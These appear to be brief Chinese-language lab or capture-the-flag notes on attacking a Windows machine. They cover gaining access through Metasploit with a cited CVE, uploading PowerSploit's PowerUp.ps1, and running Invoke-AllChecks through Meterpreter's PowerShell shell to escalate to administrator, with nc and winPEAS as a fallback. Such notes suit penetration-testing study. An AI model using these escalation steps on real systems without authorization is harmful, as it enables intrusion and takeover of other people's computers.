使用 Metasploit 获得初始访问权限，使用 Powershell 进一步列举该计算机，并将权限升级到管理员。

msf攻击利用漏洞cve2014-6867

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

下载脚本到msf 用upload

就可以powershell提权
```
load powershell
powershell_shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```


不用msf如何利用漏洞

用nc把提权脚本拉进去  winpeas